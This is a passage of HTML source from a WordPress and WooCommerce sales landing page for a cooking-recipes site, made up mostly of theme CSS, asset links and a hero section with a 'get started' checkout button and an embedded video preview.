a:hover {color: #ffffff;background-color: rgb(255,124,45);}.posts-list.list-style-v9 .posts-list__item.grid-item .grid-item-wrap .entry-header .entry-title {font-weight : 300;}/* Grid 7 */.list-style-v7 .grid-item-wrap.invert .posted-on a:hover,.list-style-v7 .grid-item-wrap.invert .cat-links a:hover,.list-style-v7 .grid-item-wrap.invert .tags-links a:hover,.list-style-v7 .grid-item-wrap.invert .byline a:hover,.list-style-v7 .grid-item-wrap.invert .comments-link:hover,.list-style-v7 .grid-item-wrap.invert .entry-title a:hover,.list-style-v6 .grid-item-wrap.invert .posted-on a:hover,.list-style-v6 .grid-item-wrap.invert .cat-links a:hover,.list-style-v6 .grid-item-wrap.invert .tags-links a:hover,.list-style-v6 .grid-item-wrap.invert .byline a:hover,.list-style-v6 .grid-item-wrap.invert .comments-link:hover,.list-style-v6 .grid-item-wrap.invert .entry-title a:hover {color: #ff5607;}.list-style-v7 .grid-item-wrap.invert .posted-on,.list-style-v7 .grid-item-wrap.invert .cat-links,.list-style-v7 .grid-item-wrap.invert .byline,.list-style-v7 .grid-item-wrap.invert .tags-links,.list-style-v7 .grid-item-wrap.invert .posted-on a,.list-style-v7 .grid-item-wrap.invert .cat-links a,.list-style-v7 .grid-item-wrap.invert .tags-links a,.list-style-v7 .grid-item-wrap.invert .byline a,.list-style-v7 .grid-item-wrap.invert .comments-link,.list-style-v7 .grid-item-wrap.invert .entry-title a,.list-style-v7 .grid-item-wrap.invert .entry-content p,.list-style-v6 .grid-item-wrap.invert .posted-on,.list-style-v6 .grid-item-wrap.invert .cat-links,.list-style-v6 .grid-item-wrap.invert .byline,.list-style-v6 .grid-item-wrap.invert .tags-links,.list-style-v6 .grid-item-wrap.invert .posted-on a,.list-style-v6 .grid-item-wrap.invert .cat-links a,.list-style-v6 .grid-item-wrap.invert .tags-links a,.list-style-v6 .grid-item-wrap.invert .byline a,.list-style-v6 .grid-item-wrap.invert .comments-link,.list-style-v6 .grid-item-wrap.invert .entry-title a,.list-style-v6 .grid-item-wrap.invert .entry-content p {color: #ffffff;}.posts-list.list-style-v7 .grid-item .grid-item-wrap .entry-footer .comments-link:hover,.posts-list.list-style-v6 .grid-item .grid-item-wrap .entry-footer .comments-link:hover,.posts-list.list-style-v6 .posts-list__item.grid-item .grid-item-wrap .btn:hover,.posts-list.list-style-v7 .posts-list__item.grid-item .grid-item-wrap .btn:hover {color: #ff5607;border-color: #ff5607;}.posts-list.list-style-v10 .grid-item-inner .space-between-content .comments-link {color: #162c5a;}.posts-list.list-style-v10 .grid-item-inner .space-between-content .comments-link:hover {color: #ff5607;}.posts-list.list-style-v10 .posts-list__item.justify-item .justify-item-inner .entry-title a {color: #162c5a;}.posts-list.posts-list--vertical-justify.list-style-v10 .posts-list__item.justify-item .justify-item-inner .entry-title a:hover{color: #ffffff;background-color: #ff5607;}.posts-list.list-style-v5 .posts-list__item.justify-item .justify-item-inner.invert .cat-links a:hover,.posts-list.list-style-v8 .posts-list__item.justify-item .justify-item-inner.invert .cat-links a:hover {color: #ffffff;background-color: rgb(255,124,45);}.posts-list.list-style-v5 .posts-list__item.justify-item .justify-item-inner.invert .cat-links a,.posts-list.list-style-v8 .posts-list__item.justify-item .justify-item-inner.invert .cat-links a{color: #ffffff;background-color: #ff5607;}.list-style-v8 .justify-item-inner.invert .posted-on,.list-style-v8 .justify-item-inner.invert .cat-links,.list-style-v8 .justify-item-inner.invert .byline,.list-style-v8 .justify-item-inner.invert .tags-links,.list-style-v8 .justify-item-inner.invert .posted-on a,.list-style-v8 .justify-item-inner.invert .cat-links a,.list-style-v8 .justify-item-inner.invert .tags-links a,.list-style-v8 .justify-item-inner.invert .byline a,.list-style-v8 .justify-item-inner.invert .comments-link,.list-style-v8 .justify-item-inner.invert .entry-title a,.list-style-v8 .justify-item-inner.invert .entry-content p,.list-style-v5 .justify-item-inner.invert .posted-on,.list-style-v5 .justify-item-inner.invert .cat-links,.list-style-v5 .justify-item-inner.invert .byline,.list-style-v5 .justify-item-inner.invert .tags-links,.list-style-v5 .justify-item-inner.invert .posted-on a,.list-style-v5 .justify-item-inner.invert .cat-links a,.list-style-v5 .justify-item-inner.invert .tags-links a,.list-style-v5 .justify-item-inner.invert .byline a,.list-style-v5 .justify-item-inner.invert .comments-link,.list-style-v5 .justify-item-inner.invert .entry-title a,.list-style-v5 .justify-item-inner.invert .entry-content p,.list-style-v4 .justify-item-inner.invert .posted-on:hover,.list-style-v4 .justify-item-inner.invert .cat-links,.list-style-v4 .justify-item-inner.invert .byline,.list-style-v4 .justify-item-inner.invert .tags-links,.list-style-v4 .justify-item-inner.invert .posted-on a,.list-style-v4 .justify-item-inner.invert .cat-links a,.list-style-v4 .justify-item-inner.invert .tags-links a,.list-style-v4 .justify-item-inner.invert .byline a,.list-style-v4 .justify-item-inner.invert .comments-link,.list-style-v4 .justify-item-inner.invert .entry-title a,.list-style-v4 .justify-item-inner.invert .entry-content p {color: #ffffff;}.list-style-v8 .justify-item-inner.invert .posted-on a:hover,.list-style-v8 .justify-item-inner.invert .cat-links a:hover,.list-style-v8 .justify-item-inner.invert .tags-links a:hover,.list-style-v8 .justify-item-inner.invert .byline a:hover,.list-style-v8 .justify-item-inner.invert .comments-link:hover,.list-style-v8 .justify-item-inner.invert .entry-title a:hover,.list-style-v5 .justify-item-inner.invert .posted-on a:hover,.list-style-v5 .justify-item-inner.invert .cat-links a:hover,.list-style-v5 .justify-item-inner.invert .tags-links a:hover,.list-style-v5 .justify-item-inner.invert .byline a:hover,.list-style-v5 .justify-item-inner.invert .entry-title a:hover,.list-style-v4 .justify-item-inner.invert .posted-on a,.list-style-v4 .justify-item-inner.invert .cat-links a:hover,.list-style-v4 .justify-item-inner.invert .tags-links a:hover,.list-style-v4 .justify-item-inner.invert .byline a:hover,.list-style-v4 .justify-item-inner.invert .comments-link:hover,.list-style-v4 .justify-item-inner.invert .entry-title a:hover{color: #ff5607;}.posts-list.list-style-v5 .justify-item .justify-item-wrap .entry-footer .comments-link:hover {border-color: #ff5607;}.list-style-v4 .justify-item-inner.invert .btn:hover,.list-style-v6 .justify-item-wrap.invert .btn:hover,.list-style-v8 .justify-item-inner.invert .btn:hover {color: #ffffff;}.posts-list.posts-list--vertical-justify.list-style-v5 .posts-list__item.justify-item .justify-item-wrap .entry-footer .comments-link:hover,.posts-list.posts-list--vertical-justify.list-style-v5 .posts-list__item.justify-item .justify-item-wrap .entry-footer .btn:hover {color: #ff5607;border-color: #ff5607;}/* masonry Posts List */.posts-list.list-style-v3 .comments-link {border-color: #ff5607;}.posts-list.list-style-v4 .comments-link {color: #162c5a;}.posts-list.list-style-v4 .posts-list__item.masonry-item .masonry-item-wrap .comments-link:hover {color: #ffffff;background-color: #ff5607;}/* Posts List masonry Item Invert */.masonry-item-wrap.invert,.masonry-item-wrap.invert .posted-on,.masonry-item-wrap.invert .cat-links,.masonry-item-wrap.invert .byline,.masonry-item-wrap.invert .tags-links,.masonry-item-wrap.invert .entry-meta,.masonry-item-wrap.invert a,.masonry-item-wrap.invert .btn-icon,.masonry-item-wrap.invert .comments-button {color: #ffffff;}/* Posts List masonry-5 Item Invert */.list-style-v5 .masonry-item-wrap.invert .posted-on,.list-style-v5 .masonry-item-wrap.invert .cat-links,.list-style-v5 .masonry-item-wrap.invert .byline,.list-style-v5 .masonry-item-wrap.invert .tags-links,.list-style-v5 .masonry-item-wrap.invert .posted-on a,.list-style-v5 .masonry-item-wrap.invert .cat-links a,.list-style-v5 .masonry-item-wrap.invert .tags-links a,.list-style-v5 .masonry-item-wrap.invert .byline a,.list-style-v5 .masonry-item-wrap.invert .comments-link,.list-style-v5 .masonry-item-wrap.invert .entry-title a:hover {color: #ff5607;}.list-style-v5 .masonry-item-wrap.invert .posted-on a:hover,.list-style-v5 .masonry-item-wrap.invert .cat-links a:hover,.list-style-v5 .masonry-item-wrap.invert .tags-links a:hover,.list-style-v5 .masonry-item-wrap.invert .byline a:hover,.list-style-v5 .masonry-item-wrap.invert .comments-link:hover {color: #ffffff;}.posts-list.list-style-v10 .masonry-item-inner .space-between-content .comments-link {color: #162c5a;}.posts-list.list-style-v10 .masonry-item-inner .space-between-content .comments-link:hover {color: #ff5607;}.widget_recent_entries a,.widget_recent_comments a {font-style: normal;font-weight: 500;font-size: 14px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;color: #162c5a;}.widget_recent_entries a:hover,.widget_recent_comments a:hover {color: #ff5607;}.widget_recent_entries .post-date,.widget_recent_comments .recentcomments {color: #162c5a;}.widget_recent_comments .comment-author-link a {color: #162c5a;}.widget_recent_comments .comment-author-link a:hover {color: #ff5607;}.widget_calendar th,.widget_calendar caption {color: #ff5607;}.widget_calendar tbody td a {color: #162c5a;}.widget_calendar tbody td a:hover {color: #ffffff;background-color: #ff5607;}.widget_calendar tfoot td a {color: #162c5a;}.widget_calendar tfoot td a:hover {color: #162c5a;}/* Preloader */.jet-smart-listing-wrap.jet-processing + div.jet-smart-listing-loading,div.wpcf7 .ajax-loader {border-top-color: #ff5607;border-right-color: #ff5607;}/* Single product */.woocommerce table.variations .reset_variations,.woocommerce-review-link{font-weight: 400;}.product_meta,.woocommerce-tabs .tabs li a,.single-product .quantity label,.woocommerce table.variations .label{font-weight: 500;}.woocommerce table.variations select{color: #162c5a;}.product_meta .sku_wrapper span,.product_meta .posted_in a,.product_meta .tagged_as a{font-weight: 300;}.woocommerce-tabs .tabs li a{color: #162c5a;}.woocommerce-tabs .tabs li a:hover{color: #ff5607;}/* #Button Appearance Styles (regular scheme) */.elementor-widget-wp-widget-woocommerce_product_search button,.widget_product_search button,.added_to_cart.wc-forward,.woocommerce .button {font-style: normal;font-weight: 900;font-size: 11px;line-height: 1;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 1px;color: #ffffff;background-color: #ff5607;}.elementor-widget-wp-widget-woocommerce_product_search button:hover,.widget_product_search button:hover,.added_to_cart.wc-forward:hover,.button:hover{color: #ffffff;background-color: rgb(255,124,45);}.widget_recently_viewed_products .amount,.widget_products .amount,.widget_top_rated_products .amount,.price,table.woocommerce-grouped-product-list tr td.woocommerce-grouped-product-list-item__price{font-weight: 400;}/*Reviews*/ol.commentlist li .meta strong{font-weight: 300;}ol.commentlist li .meta{color: #162c5a;}/*Single Product Thumbnails*/.woocommerce-product-gallery__trigger{background-color: #ffffff;color: #162c5a;}.woocommerce-product-gallery__trigger:hover{background-color: #162c5a;color:#ffffff;}/*WooCommerce cart page*/.woocommerce-cart table tr td.product-remove a{color: #162c5a;}.woocommerce-cart table tr td.product-name a{color: #162c5a;}.woocommerce-cart table tr td.product-price ,.woocommerce-cart table tr td.product-subtotal,.woocommerce-cart .cart-collaterals table tr.cart-subtotal .amount,.woocommerce-cart .cart-collaterals table tr.order-total .amount {font-weight: 400;color: #162c5a;}.woocommerce-cart table tr td.product-quantity input{color:#162c5a;}.woocommerce-cart table tr th,.woocommerce-account .woocommerce .woocommerce-MyAccount-content label,.woocommerce-cart table tr td.actions label{font-weight: 500;}.woocommerce-cart table tr td.actions > .button,.woocommerce-cart .cart-collaterals table tr.order-total .amount{color: #ff5607;}.woocommerce-cart table tr td.actions > .button:hover{color: #162c5a;}.woocommerce-cart table tr td.product-remove a:hover,.woocommerce-cart table tr td.product-name a:hover {color: #ff5607;}.select2-container--default .select2-selection--single .select2-selection__rendered{color:#162c5a;}.woocommerce-cart .cart-collaterals .wc-proceed-to-checkout a:hover{background-color:#ff5607;}.woocommerce-cart table tr td.actions{background-color: rgba(255,86,7,0.05);}/*WooCommerce checkout*/.woocommerce-checkout label,.woocommerce-account .woocommerce label:not(.woocommerce-form__label-for-checkbox),.lost_password a,.comment-form label,.woocommerce-checkout .woocommerce-checkout-review-order table .amount,.woocommerce-checkout .woocommerce-checkout-review-order table tr th,.woocommerce-checkout .woocommerce-checkout-review-order table tbody tr td .product-quantity{font-weight: 500;}.woocommerce-checkout .woocommerce-checkout-review-order table tbody tr td .product-quantity{color:#ff5607;}.woocommerce-checkout .woocommerce-checkout-review-order table tfoot,.wc_payment_methods li .payment_box{background-color: rgba(255,86,7,0.05);}.woocommerce-checkout .woocommerce-message,.woocommerce-checkout .woocommerce-error,.woocommerce-checkout .woocommerce-info{font-weight: 400;}label.checkbox input[type="checkbox"] + span::after,label.inline input[type="checkbox"] + span::after {color: #ff5607;}label.checkbox.woocommerce-form__label,label.inline.woocommerce-form__label{color:#162c5a;font-weight: 300;}.woocommerce-checkout .place-order .button:hover{background-color:#ff5607;}/*WooCommerce my-account*/.woocommerce-account .woocommerce .woocommerce-MyAccount-navigation ul li{font-weight: 900;}.woocommerce-account .woocommerce .woocommerce-MyAccount-navigation ul li a:hover,.woocommerce-account .woocommerce .woocommerce-MyAccount-navigation ul li.is-active a{color: #ffffff;background-color: #ff5607;border-color: #ff5607;}.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td:first-child,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr th,.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr td:first-child,.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr th,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td:first-child,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr th{font-weight: 500;}.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr td a:not(.button),.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td a,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td a{color: #162c5a;font-weight:300;}.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr td a:not(.button):hover,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td a:hover,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td a:hover{color: #ff5607;}.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr td.woocommerce-table__product-name .product-quantity,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td.woocommerce-table__product-name .product-quantity,.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td.woocommerce-table__product-name .product-quantity{color: #162c5a;}ul.woocommerce-order-overview li strong{font-weight: 500;}.woocommerce-order-received .woocommerce .woocommerce-order table.shop_table.order_details tr td.woocommerce-table__product-name .product-quantity{font-weight:300;}.woocommerce-account .woocommerce .woocommerce-MyAccount-content legend{font-weight: 400;}.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td.woocommerce-orders-table__cell-order-actions .button,.woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td.download-file .button,table.woocommerce-table--order-downloads.shop_table tbody tr td.download-file .button{font-style: normal;font-weight: 300;font-size: 14px;line-height: 1.6;font-family: 'Fira Sans', sans-serif;;letter-spacing: 0px;text-align: left;color: #ff5607;}.woocommerce-account .woocommerce .woocommerce-MyAccount-content mark{color: #ff5607;}.woocommerce-account .woocommerce .woocommerce-MyAccount-content table.woocommerce-orders-table tr td.woocommerce-orders-table__cell-order-actions .button:hover,.woocommerce .woocommerce-MyAccount-content table.shop_table.order_details tr td.download-file .button:hover,table.woocommerce-table--order-downloads.shop_table tbody tr td.download-file .button:hover {color: #162c5a;}/*WooCommerce widgets*/.widget_price_filter .ui-slider-handle,.widget_price_filter .ui-slider-range{background-color: #ff5607;}.widget_shopping_cart .quantity{color: #162c5a;}.widget_shopping_cart,.widget_shopping_cart a:not(.button),.widget_recently_viewed_products a,.widget_products a,.widget_top_rated_products a,.widget_recent_reviews a{color: #162c5a;}.widget_shopping_cart a:not(.button):hover,.widget_recently_viewed_products a:hover,.widget_products a:hover,.widget_top_rated_products a:hover,.widget_recent_reviews a:hover{color: #ff5607;}.widget_rating_filter li.chosen:before,.widget_product_categories li.current-cat:before{background-color: #ff5607;border-color: #ff5607;}.widget_rating_filter li:after,.widget_product_categories li:after{color: #ffffff;}.select2-container--default .select2-selection--single .select2-selection__rendered{color: #162c5a;}.widget_shopping_cart .woocommerce-mini-cart__total > strong,.widget_shopping_cart .quantity .amount{font-weight: 500;}.widget_shopping_cart .woocommerce-mini-cart__total .amount{font-weight: 400;}.widget_shopping_cart .woocommerce-mini-cart__buttons .wc-forward:not(.checkout){color: #ff5607;font-weight: 400;}.widget_shopping_cart .woocommerce-mini-cart__buttons .wc-forward:not(.checkout):hover{color: #162c5a;}.header-cart__link{color: #162c5a;}.header-cart__link:hover{color: #ff5607;}.widget_shopping_cart .woocommerce-mini-cart__total > strong,.widget_shopping_cart .quantity .amount,.header-cart .amount{color: #162c5a;}/*Store Notice*/.woocommerce-store-notice{background-color: #ff5607;color: #ffffff;}.woocommerce-store-notice__dismiss-link:hover,.woocommerce-store-notice__dismiss-link{color: #ffffff;}
</style>
<link rel='stylesheet' id='blog-layouts-module-css' href='wp-content/themes/freebook/inc/modules/blog-layouts/assets/css/blog-layouts-module8a54.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='freebook-woocommerce-style-css' href='wp-content/themes/freebook/inc/modules/woo/assets/css/woo-module8a54.css?ver=1.0.0' type='text/css' media='all' />
<link rel='stylesheet' id='cx-google-fonts-freebook-css' href='http://fonts.googleapis.com/css?family=Fira+Sans%3A300%7CFira+Sans+Condensed%3A400%2C300%2C500%2C900%7CMontserrat%3A700%7COpen+Sans%3A400&amp;subset=latin&amp;ver=6.2' type='text/css' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CPoppins%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=auto&amp;ver=6.2' type='text/css' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type='text/javascript' src='wp-includes/js/jquery/jquery.mina767.js?ver=3.6.3' id='jquery-core-js'></script>
<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min6b00.js?ver=3.4.0' id='jquery-migrate-js'></script>
<link rel="https://api.w.org/" href="wp-json/index.html" /><link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/8.json" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" />
<meta name="generator" content="WordPress 6.2" />
<meta name="generator" content="WooCommerce 7.6.1" />
<link rel="canonical" href="index.html" />
<link rel='shortlink' href='index.html' />
<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embed2e45.json?url=https%3A%2F%2Ftastycookingideas.com%2F" />
<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed0089?url=https%3A%2F%2Ftastycookingideas.com%2F&amp;format=xml" />
<link rel="preconnect" href="https://cdnjs.cloudflare.com/"><link rel='preconnect' href='https://i0.wp.com/' crossorigin><link rel='dns-prefetch' href='https://i0.wp.com/'><link rel='preconnect' href='https://i1.wp.com/' crossorigin><link rel='dns-prefetch' href='https://i1.wp.com/'><link rel='preconnect' href='https://i2.wp.com/' crossorigin><link rel='dns-prefetch' href='https://i2.wp.com/'><link rel='preconnect' href='https://i3.wp.com/' crossorigin><link rel='dns-prefetch' href='https://i3.wp.com/'>	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<meta name="generator" content="Elementor 3.13.0; features: e_dom_optimization, e_optimized_assets_loading, e_optimized_css_loading, e_font_icon_svg, a11y_improvements, additional_custom_breakpoints; settings: css_print_method-internal, google_font-enabled, font_display-auto">
<link rel="icon" href="wp-content/uploads/2019/05/favicons.png" sizes="32x32" />
<link rel="icon" href="wp-content/uploads/2019/05/favicons.png" sizes="192x192" />
<link rel="apple-touch-icon" href="wp-content/uploads/2019/05/favicons.png" />
<meta name="msapplication-TileImage" content="https://tastycookingideas.com/wp-content/uploads/2019/05/favicons.png" />
		<style type="text/css" id="wp-custom-css">
			body:not(.page-template-fullwidth-content) .site-content {
	margin-top: 0;align-content}
	
.container {
    max-width: 100%!important;
}

.site-header__wrap {
  
    display: none;
}

.top-panel {
   
    display: none;
}

.wc_payment_methods li * {
    display: revert;
}

.tnp-field label {
    color: #fff;
}

.site-content__wrap {margin:10em}

.footer-width-fixer a {color:white}

.footer-width-fixer a:hover {color:green}

.footer-width-fixer {color:white}

.footer-width-fixer H5 {color:white}

.footer-width-fixer p {color:white}

body:not(.page-template-fullwidth-content) .site-content {
    margin-bottom: 0;
}


@media only screen and (max-width: 600px) {
  .site-content__wrap {
    margin: 1em;
  }
}
		</style>
		</head>

<body data-rsssl=1 class="home page-template page-template-elementor_header_footer page page-id-8 theme-freebook woocommerce-no-js wcz-woocommerce ehf-footer ehf-template-freebook ehf-stylesheet-freebook layout-fullwidth blog-default woocommerce-active elementor-default elementor-template-full-width elementor-kit-1 elementor-page elementor-page-8">
<div class="page-preloader-cover">
				<div class="page-preloader"></div>
			</div><div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
	<header id="masthead" class="site-header ">
		

<div class="top-panel container">
	<div class="space-between-content">
		<div class="top-panel-content__left">
										</div>
		<div class="top-panel-content__right">
											<div class="header-cart">
				<div class="header-cart__link-wrap ">
						<a class="header-cart__link" href="#" title="View your shopping cart">
		  				<i class="header-cart__link-icon"></i>
				<span class="header-cart__link-count">0</span>
			</a>
						</div>
				<div class="header-cart__content">
			<div class="widget woocommerce widget_shopping_cart"><h2 class="widgettitle">My cart</h2><div class="widget_shopping_cart_content"></div></div>				</div>
			</div>
				</div>
	</div>
</div>
<div class="site-header__wrap container">
		<div class="space-between-content">
		<div class="site-branding">
			<h1 class="site-logo"><a class="site-logo__link" href="index.html" rel="home">TastyCookingIdeas.com</a></h1>		</div>
			<nav id="site-navigation" class="main-navigation" role="navigation">
		<div class="main-navigation-inner">
				</div>
	</nav><!-- #site-navigation -->
		</div>
	</div>
	</header><!-- #masthead -->
		<div id="content" class="site-content ">
		<div data-elementor-type="wp-post" data-elementor-id="8" class="elementor elementor-8">
									<section class="elementor-section elementor-top-section elementor-element elementor-element-03a9e2b elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="03a9e2b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-a3183bb" data-id="a3183bb" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-0ba973b elementor-widget elementor-widget-spacer" data-id="0ba973b" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-column .elementor-spacer-inner{height:var(--spacer-size)}.e-con{--container-widget-width:100%}.e-con-inner>.elementor-widget-spacer,.e-con>.elementor-widget-spacer{width:var(--container-widget-width,var(--spacer-size));--align-self:var(--container-widget-align-self,initial);--flex-shrink:0}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container,.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer,.e-con>.elementor-widget-spacer>.elementor-widget-container,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer{height:100%}.e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner,.e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner{height:var(--container-widget-height,var(--spacer-size))}</style>		<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b1f4ca8 elementor-widget elementor-widget-spacer" data-id="b1f4ca8" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-38b7e6d elementor-widget elementor-widget-image" data-id="38b7e6d" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.13.0 - 08-05-2023 */
.elementor-widget-image{text-align:center}.elementor-widget-image a{display:inline-block}.elementor-widget-image a img[src$=".svg"]{width:48px}.elementor-widget-image img{vertical-align:middle;display:inline-block}</style>												<img decoding="async" src="../aztechost.com/images/recipe/uploads/2021/12/recipe-logo.png" title="" alt="" loading="lazy" />															</div>
				</div>
				<div class="elementor-element elementor-element-894939f elementor-widget elementor-widget-spacer" data-id="894939f" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ebd1438 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="ebd1438" data-element_type="widget" data-widget_type="icon-list.default">
				<div class="elementor-widget-container">
			<link rel="stylesheet" href="wp-content/plugins/elementor/assets/css/widget-icon-list.min.css">		<ul class="elementor-icon-list-items">
							<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Learn how to cook delicious meals with ease</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Learn to effectively plan your meals to save time</span>
									</li>
								<li class="elementor-icon-list-item">
											<span class="elementor-icon-list-icon">
							<svg aria-hidden="true" class="e-font-icon-svg e-fas-check" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>						</span>
										<span class="elementor-icon-list-text">Enjoy a wide range of healthy, every day recipes</span>
									</li>
						</ul>
				</div>
				</div>
				<div class="elementor-element elementor-element-c31e9f1 elementor-widget elementor-widget-spacer" data-id="c31e9f1" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-41eca6d elementor-align-left elementor-widget elementor-widget-button" data-id="41eca6d" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a href="checkout/index4f50.html?add-to-cart=537" class="elementor-button-link elementor-button elementor-size-lg" role="button">
						<span class="elementor-button-content-wrapper">
						<span class="elementor-button-text">GET STARTED NOW</span>
		</span>
					</a>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-71a2407 elementor-widget elementor-widget-spacer" data-id="71a2407" data-element_type="widget" data-widget_type="spacer.default">
				<div class="elementor-widget-container">
					<div class="elementor-spacer">
			<div class="elementor-spacer-inner"></div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-fea3a06" data-id="fea3a06" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-97365a0 elementor-widget elementor-widget-html" data-id="97365a0" data-element_type="widget" data-widget_type="html.default">
				<div class="elementor-widget-container">
			<iframe style="border-radius:12px; border: solid 5px grey; margin:20px;" src="https://drive.google.com/file/d/1rBNQNCsTu1VETweI2423cQAYiVa01x6T/preview" width="
380" height="370" allow="autoplay"></iframe>		</div>
				</div>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-e56694c elementor-section-full_width elementor-section-height-min-height elementor-section-height-default elementor-section-items-middle" data-id="e56694c" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-12a1219" data-id="12a1219" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
